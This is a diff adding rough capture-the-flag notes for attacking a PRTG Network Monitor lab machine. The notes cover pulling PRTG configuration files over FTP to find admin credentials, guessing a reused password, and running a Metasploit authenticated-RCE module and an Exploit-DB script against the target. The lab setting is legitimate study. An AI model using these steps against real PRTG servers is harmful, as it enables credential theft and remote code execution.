@@ -99,3 +99,33 @@ prtg default credentials
 prtg exploit
 Authenticated = logged
 prtg network monitor db file location
+find place of credentials
+cd "All Users"
+cd "Application data\Paessler\PRTG Network Monitor"
+ftp> get "PRTG Configuration.dat"
+ftp> get "PRTG Configuration.old"
+ftp> get "PRTG Configuration.old.dat"
+bye
+
+ls | grep PRTG
+
+cat PRTG\ Configuration.dat | grep prtgadmin prtgadmin
+
+gedit PRTG... encrypted password: 
+password reuse 2018-2019common
+use windows/http/prtg_authenticated_rce
+
+exploit db : PRTG Network Monitor Authenticated
+https://www.exploit-db.com/exploits/44500
+python
+Burp Suite + Foxy Proxy
+get OCTOPUS burp suite
+get .py
+chmod +X new.sh
+./new.sh -u http://10.10.10.152 -c "OCTOPUS____"
+
+
+
+
+
+
